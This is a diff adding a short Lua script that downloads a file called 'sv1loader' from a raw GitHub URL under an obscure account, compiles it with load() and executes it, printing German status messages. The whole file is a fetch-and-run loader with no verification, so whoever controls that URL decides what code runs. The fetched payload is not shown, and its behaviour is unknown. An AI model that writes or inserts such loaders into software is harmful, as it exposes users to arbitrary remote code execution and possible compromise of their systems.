@@ -1,0 +1,22 @@
+local http = require("socket.http")
+
+local url = "https://raw.githubusercontent.com/onionizs21/henhdgd/refs/heads/main/sv1loader"
+
+local response, status = http.request(url)
+
+if status == 200 and response then
+    local func, err = load(response)
+    if not func then
+        print("Fehler beim Kompilieren:", err)
+        return
+    end
+
+    local success, result = pcall(func)
+    if not success then
+        print("Fehler beim Ausführen:", result)
+    else
+        print("Script erfolgreich ausgeführt.")
+    end
+else
+    print("Fehler beim Laden des Scripts:", status)
+end
